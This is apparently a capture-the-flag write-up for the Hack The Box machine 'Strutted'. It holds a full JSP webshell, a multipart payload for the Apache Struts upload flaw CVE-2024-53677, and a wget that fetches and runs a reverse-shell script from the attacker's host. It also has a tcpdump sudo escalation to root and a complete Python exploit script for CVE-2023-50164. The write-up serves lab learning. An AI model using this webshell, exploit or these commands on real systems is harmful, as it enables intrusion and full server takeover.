# Nmap
```
# Nmap 7.95 scan initiated Thu Jul 24 14:22:20 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.59
Nmap scan report for 10.10.11.59
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 24 14:33:15 2025 -- 1 IP address (1 host up) scanned in 655.08 seconds
```

Add `strutted.htb` to our `/etc/hosts`

# Page check
**index page**
![](images/Pasted%20image%2020250724143527.png)
There is a upload api for us,
We can try to upload the picture and check what is going on next
![](images/Pasted%20image%2020250724143652.png)
But we can't copy the link here.

And we can press the `Download` button to check the source code of this service

From the file `tomcat-users.xml` we can get the credit of `admin`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Strutted]
└─$ cat tomcat-users.xml 
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

From the file `pom.xml`, we can find the versions of dependency
```
<properties>
<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
<maven.compiler.source>17</maven.compiler.source>
<maven.compiler.target>17</maven.compiler.target>
<struts2.version>6.3.0.1</struts2.version>
<jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
<maven.javadoc.skip>true</maven.javadoc.skip>
<jackson.version>2.14.1</jackson.version>
<jackson-data-bind.version>2.14.1</jackson-data-bind.version>
</properties>
```

From the docker file `Dockerfile` we get the docker process
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Strutted]
└─$ cat Dockerfile      
FROM --platform=linux/amd64 openjdk:17-jdk-alpine
#FROM openjdk:17-jdk-alpine

RUN apk add --no-cache maven

COPY strutted /tmp/strutted
WORKDIR /tmp/strutted

RUN mvn clean package

FROM tomcat:9.0

RUN rm -rf /usr/local/tomcat/webapps/
RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/
RUN rm -rf /usr/local/tomcat/webapps/ROOT

COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war
COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml

EXPOSE 8080

CMD ["catalina.sh", "run"]

```

By enumerate the exploits of the dependency, I found something interesting here
![](images/Pasted%20image%2020250724144403.png)

# CVE-2024-53677
`CVE-2024-53677 – Critical Apache Struts Remote Code Execution Vulnerability`
There is a good exploit script from 
`https://github.com/TAM-K592/CVE-2024-53677-S2-067.git`
`https://github.com/EQSTLab/CVE-2024-53677.git`

By run the exploit script, it hints us the file upload is successful, but can't find the uploaded page
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Strutted/CVE-2024-53677-S2-067]
└─$ python3 S2-067.py -u http://strutted.htb --upload_endpoint upload.action --files webshell.jsp --destination ../../webshell.jsp
[INFO] Uploading files to http://strutted.htb/upload.action...
[SUCCESS] File webshell.jsp uploaded successfully: ../../webshell.jsp
[INFO] Verifying uploaded file: http://strutted.htb/webshell.jsp
[INFO] File not accessible. HTTP Status: 404
```

So I would use `burpsuite` to exploit it manually and follow the article of `Tanium`
`https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm`

Firstly, I would like upload a normal test picture to help us upload a web-shell:
![](images/Pasted%20image%2020250724155957.png)

Secondly, we can delete some picture strings and add some jsp shell code 
![](images/Pasted%20image%2020250724151903.png)
There is a example web jsp shell 
```
<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            // Execute system commands
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\n";
                }
                reader.close();
            }
        } else if ("upload".equals(action)) {
            // File upload
            String filePath = request.getParameter("path");
            String fileContent = request.getParameter("content");
            if (filePath != null && fileContent != null) {
                File file = new File(filePath);
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                    writer.write(fileContent);
                }
                output = "File uploaded to: " + filePath;
            } else {
                output = "Invalid file upload parameters.";
            }
        } else if ("list".equals(action)) {
            // List directory contents
            String dirPath = request.getParameter("path");
            if (dirPath != null) {
                File dir = new File(dirPath);
                if (dir.isDirectory()) {
                    for (File file : Objects.requireNonNull(dir.listFiles())) {
                        output += file.getName() + (file.isDirectory() ? "/" : "") + "\n";
                    }
                } else {
                    output = "Path is not a directory.";
                }
            } else {
                output = "No directory path provided.";
            }
        } else if ("delete".equals(action)) {
            // Delete files
            String filePath = request.getParameter("path");
            if (filePath != null) {
                File file = new File(filePath);
                if (file.delete()) {
                    output = "File deleted: " + filePath;
                } else {
                    output = "Failed to delete file: " + filePath;
                }
            } else {
                output = "No file path provided.";
            }
        } else {
            // Unknown operation
            output = "Unknown action: " + action;
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }

    // Return the result
    response.setContentType("text/plain");
    out.print(output);
%>
```
![](images/Pasted%20image%2020250724160121.png)
We can found the malicious code successfully inject to the picture.

Now, we need to manipulate the file upload by adding the `top.uploadFileName` parameter so that the file is copied to a sensitive location, such as the root directory of Tomcat. In addition, we must also change the lowercase "u" in upload to an uppercase "U"
For the reason why we need to change `upload` to `Upload`
```
The default file upload interceptor used by Apache Struts 2 is the FileUploadInterceptor in the interceptor stack named defaultStack, and it internally relies on an interceptor reference named "upload" or "Upload" by default to bind the upload processing logic. Whether the specific name is case-sensitive depends on the configuration method.
```
By check the source code of download zip file before, I found from `/strutted/src/main/resources/struts.xml`
```
<package name="default" namespace="/" extends="struts-default">
<default-action-ref name="upload"/>
<action name="upload" class="org.strutted.htb.Upload">
<interceptor-ref name="fileUpload">
<param name="maximumSize">2097152</param>
<param name="allowedExtensions">jpg,jpeg,png,gif</param>
<param name="message">
Invalid file type! Allowed types: jpg, jpeg, png, gif.
</param>
</interceptor-ref>
<interceptor-ref name="defaultStack"/>
<result name="input">WEB-INF/upload.jsp</result>
<result name="error">WEB-INF/error.jsp</result>
<result name="success">WEB-INF/success.jsp</result>
</action>
```

So the exploit form would be:
```
-----------------------------82912526535569421431365127366
Content-Disposition: form-data; name="Upload"; filename="wither_rose.png"
Content-Type: image/png

(SNIP)
-----------------------------82912526535569421431365127366
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
-----------------------------82912526535569421431365127366--
```
Then we can find it was uploaded successfully into `../../shell.jsp`
![](images/Pasted%20image%2020250724152124.png)

Finally we can get the access to web-shell
![](images/Pasted%20image%2020250724152258.png)

Let's exploit it to get the reverse shell
```
http://strutted.htb/shell.jsp?action=cmd&cmd=id
```
![](images/Pasted%20image%2020250724152445.png)

Then let's upload the shell script and run it
```
http://strutted.htb/shell.jsp?action=cmd&cmd=wget+http://10.10.14.5/shell.sh+-o+/tmp/shell.sh

http://strutted.htb/shell.jsp?action=cmd&cmd=chmod+777+/tmp/shell.sh

http://strutted.htb/shell.jsp?action=cmd&cmd=ls+-l+/tmp
total 1052
drwxr-x--- 2 tomcat tomcat    4096 Jul 24 04:20 hsperfdata_tomcat
-rwxrwxrwx 1 tomcat tomcat     253 Jul 24 05:43 shell.sh
-rwxr----- 1 tomcat tomcat 1068672 Jul 24 04:38 sqlite-3.47.1.0-ec05ed08-bea3-42d3-9ef7-abc54923551c-libsqlitejdbc.so
-rw-r----- 1 tomcat tomcat       0 Jul 24 04:38 sqlite-3.47.1.0-ec05ed08-bea3-42d3-9ef7-abc54923551c-libsqlitejdbc.so.lck

http://strutted.htb/shell.jsp?action=cmd&cmd=bash+/tmp/shell.sh
```
Finally we can get the reverse shell as `tomcat`

# shell as james
By enumerate the file system, we can find `tomcat-users.xml` from `/etc/tomcat9/`
```
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
```
We can get the credit of admin `IT14d6SSP81k`

Let's check the `/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat9:/usr/sbin/nologin
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
I guess `james` would be our target, let's try to `su` and `ssh` to switch to `james`

Then we can successfully get into shell as `james` by ssh
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Strutted]
└─$ ssh james@10.10.11.59     
The authenticity of host '10.10.11.59 (10.10.11.59)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:105: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.59' (ED25519) to the list of known hosts.
james@10.10.11.59's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)
james@strutted:~$ whoami
james
```

# shell as root
Firstly, I would like check the `sudo -l` firstly
```
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump

```
We can find the exploit hints from `GTOBins`
![](images/Pasted%20image%2020250724154408.png)
Let's exploit it step by step
```
james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -al /tmp
total 1424
drwxrwxrwt 13 root  root     4096 Jul 24 05:55 .
drwxr-xr-x 18 root  root     4096 Jan 15  2025 ..
-rwsr-sr-x  1 root  root  1396520 Jul 24 05:55 bash
drwxrwxrwt  2 root  root     4096 Jul 24 04:20 .font-unix
drwxrwxrwt  2 root  root     4096 Jul 24 04:20 .ICE-unix
drwx------  3 root  root     4096 Jul 24 04:20 systemd-private-0ec4762257284b49a7a288471d8d66cd-ModemManager.service-3Gocqn
drwx------  3 root  root     4096 Jul 24 04:20 systemd-private-0ec4762257284b49a7a288471d8d66cd-systemd-logind.service-ZGKgm2
drwx------  3 root  root     4096 Jul 24 04:20 systemd-private-0ec4762257284b49a7a288471d8d66cd-systemd-resolved.service-C5f7Jn
drwx------  3 root  root     4096 Jul 24 04:20 systemd-private-0ec4762257284b49a7a288471d8d66cd-systemd-timesyncd.service-B5201l
drwx------  3 root  root     4096 Jul 24 04:20 systemd-private-0ec4762257284b49a7a288471d8d66cd-tomcat9.service-VaHTV0
drwxrwxrwt  2 root  root     4096 Jul 24 04:20 .Test-unix
-rwx--x--x  1 james james       3 Jul 24 05:54 tmp.ouGLxhY3J4
-rwx--x--x  1 james james      45 Jul 24 05:54 tmp.scQHYSWaqg
drwx------  2 root  root     4096 Jul 24 04:21 vmware-root_610-2731152165
drwxrwxrwt  2 root  root     4096 Jul 24 04:20 .X11-unix
drwxrwxrwt  2 root  root     4096 Jul 24 04:20 .XIM-unix
james@strutted:~$ /tmp/bash -p
bash-5.1# whoami
root

```

# Beyond the Footpath

After I own this machine, I start to fix the automatic exploit script 

I choose the `https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE.git`

And follow `https://www.rjeon.com/general/demo/2019/06/05/side1.html` this article to make the `exploit.py` script can bypass the Image Filters
```
import os
import sys
import time
import string
import random
import argparse
import requests
from urllib.parse import urlparse, urlunparse
from requests_toolbelt import MultipartEncoder
from requests.exceptions import ConnectionError

MAX_ATTEMPTS = 10
DELAY_SECONDS = 1
HTTP_UPLOAD_PARAM_NAME = "upload"
NAME_OF_WEBSHELL = "webshell"
NAME_OF_WEBSHELL_WAR = NAME_OF_WEBSHELL + ".war"
NUMBER_OF_PARENTS_IN_PATH = 5  # Updated to match File/<TimeStamp>/uploads/ROOT/webapps


def get_base_url(url):
    parsed_url = urlparse(url)
    base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, "", "", "", ""))
    return base_url


def create_war_file():
    if not os.path.exists(NAME_OF_WEBSHELL_WAR):
        os.system("jar -cvf {} {}".format(NAME_OF_WEBSHELL_WAR, NAME_OF_WEBSHELL + '.jsp'))
        print("[+] WAR file created successfully.")
    else:
        print("[+] WAR file already exists.")


def upload_file(url):
    create_war_file()

    if not os.path.exists(NAME_OF_WEBSHELL_WAR):
        print("[-] ERROR: webshell.war not found in the current directory.")
        exit()

    war_location = '../' * (NUMBER_OF_PARENTS_IN_PATH - 1) + 'webapps/' + NAME_OF_WEBSHELL_WAR

    # Inject GIF polyglot header to bypass file type filter
    war_file_content = open(NAME_OF_WEBSHELL_WAR, "rb").read()
    war_file_content = b"GIF89a;" + war_file_content

    files = {
        HTTP_UPLOAD_PARAM_NAME.capitalize(): ("arbitrary.gif", war_file_content, "image/gif"),
        HTTP_UPLOAD_PARAM_NAME + "FileName": war_location
    }

    boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {"Content-Type": m.content_type}

    try:
        response = requests.post(url, headers=headers, data=m)
        if response.status_code == 200:
            print(f"[+] {NAME_OF_WEBSHELL_WAR} uploaded successfully.")
        else:
            raise requests.RequestException('Wrong status code: ' + str(response.status_code))
    except requests.RequestException as e:
        print("[-] Error while uploading the WAR webshell:", e)
        sys.exit(1)


def attempt_connection(url):
    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            r = requests.get(url)
            if r.status_code == 200:
                print('[+] Successfully connected to the web shell.')
                return True
            else:
                raise Exception
        except ConnectionError:
            if attempt == MAX_ATTEMPTS:
                print(f'[-] Maximum attempts reached. Unable to establish a connection with the web shell. Exiting...')
                return False
            time.sleep(DELAY_SECONDS)
        except Exception:
            if attempt == MAX_ATTEMPTS:
                print('[-] Maximum attempts reached. Exiting...')
                return False
            time.sleep(DELAY_SECONDS)
    return False


def start_interactive_shell(url):
    if not attempt_connection(url):
        sys.exit()

    while True:
        try:
            cmd = input("\033[91mCMD\033[0m > ")
            if cmd == 'exit':
                raise KeyboardInterrupt
            r = requests.get(url + "?cmd=" + cmd, verify=False)
            if r.status_code == 200:
                print(r.text.replace('\n\n', ''))
            else:
                raise Exception
        except KeyboardInterrupt:
            sys.exit()
        except ConnectionError:
            print('[-] We lost our connection to the web shell. Exiting...')
            sys.exit()
        except:
            print('[-] Something unexpected happened. Exiting...')
            sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for CVE-2023-50164 by uploading a webshell to a vulnerable Struts app's server.")
    parser.add_argument("--url", required=True, help="Full URL of the upload endpoint.")
    args = parser.parse_args()

    if not args.url.startswith("http"):
        print("[-] ERROR: Invalid URL. Please provide a valid URL starting with 'http' or 'https'.")
        exit()

    print("[+] Starting exploitation...")
    upload_file(args.url)

    webshell_url = f"{get_base_url(args.url)}/{NAME_OF_WEBSHELL}/{NAME_OF_WEBSHELL}.jsp"
    print(f"[+] Reach the JSP webshell at {webshell_url}?cmd=<COMMAND>")

    print(f"[+] Attempting a connection with webshell.")
    start_interactive_shell(webshell_url)

```

Then you can run the exploit script
```
┌──(wither㉿localhost)-[~/…/htb-labs/Strutted/CVE-2023-50164-Apache-Struts-RCE/exploit]
└─$ python3 exploit.py --url http://strutted.htb/upload.action
[+] Starting exploitation...
[+] WAR file already exists.
[+] webshell.war uploaded successfully.
[+] Reach the JSP webshell at http://strutted.htb/webshell/webshell.jsp?cmd=<COMMAND>
[+] Attempting a connection with webshell.
[+] Successfully connected to the web shell.
CMD > id
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
CMD > whoami
tomcat
CMD > 

```

# Description

For the foothold, there is no way to directly use the exploit script to get the hot verse shell, and there are also rabbit holes for upload and upload, which is somewhat confusing.

For user and root, it is very simple and clear to exploit.

Why do we need to upload the location to `../../shell.jsp` instead of `../shell.jsp`.
The main reason we can find from `web.xml`
```
<servlet-mapping>
        <servlet-name>staticServlet</servlet-name>
        <url-pattern>/uploads/*</url-pattern>
    </servlet-mapping>

    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```
The first of these defines anything in /uploads/* , just like `staticServlet` , for serving static files.